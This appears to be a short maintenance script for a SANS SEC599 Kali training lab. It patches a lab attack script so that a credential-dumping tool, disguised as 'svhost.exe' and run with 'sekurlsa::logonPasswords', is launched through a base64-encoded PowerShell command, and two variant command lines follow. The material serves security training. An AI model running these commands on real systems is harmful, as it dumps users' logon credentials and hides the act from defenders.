# SEC599 Maintenance script for Kali DTF
# --------------------------------------
# Last update: 30 January 2019
# This script is used for emergency patches / updates in SEC599

sed -i 's/-x "C:\\Users\\dwight\.schrute\\Downloads\\svhost.exe privilege::debug sekurlsa::logonPasswords exit"/-x "powershell.exe -Enc QzpcXFVzZXJzXFxkd2lnaHQuc2NocnV0ZVxcRG93bmxvYWRzXFxzdmhvc3QuZXhlIHNla3VybHNhOjpsb2dvblBhc3N3b3JkcyBleGl0"/g' /root/Desktop/CTF/4-movetowin01-INITIAL.sh

-x 'C:\\Users\\alan.marshall\\Downloads\svhost.exe privilege::debug sekurlsa::logonPasswords exit'
-x 'powershell.exe -Command "C:\\Users\\alan.marshall\\Downloads\svhost.exe sekurlsa::logonPasswords exit"'
